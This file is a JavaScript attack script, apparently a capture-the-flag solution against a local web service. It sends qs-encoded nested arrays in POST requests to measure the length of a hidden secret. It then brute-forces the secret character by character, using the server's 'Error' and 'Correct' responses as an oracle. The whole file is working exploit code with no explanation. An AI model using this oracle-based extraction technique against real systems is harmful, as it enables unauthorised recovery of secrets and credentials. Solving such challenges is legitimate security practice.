import { stringify } from 'qs'

const kAlphabet = 'abcdefghijklmnopqrstuvwxyz0123456789{}_'

const current = [[1]]

while (true) {
    const res = await (await fetch('http://localhost:3000', {
        method: 'POST',
        headers: {
            'content-type': 'application/x-www-form-urlencoded'
        },
        body: stringify({ value: current })
    })).text()

    if (res.includes('Error')) {
        console.log(res)
        break
    }

    current.push([1])
}

for (let i = 0; i < current.length; i++) {
    for (let j = 0; j < kAlphabet.length; j++) {
        current[i] = kAlphabet[j]

        const res = await (await fetch('http://localhost:3000', {
            method: 'POST',
            headers: {
                'content-type': 'application/x-www-form-urlencoded'
            },
            body: stringify({ value: current })
        })).text()

        if (res.includes('Error') || res.includes('Correct')) {
            break
        }
    }

    console.log(current)
}

console.log(current.join(''))
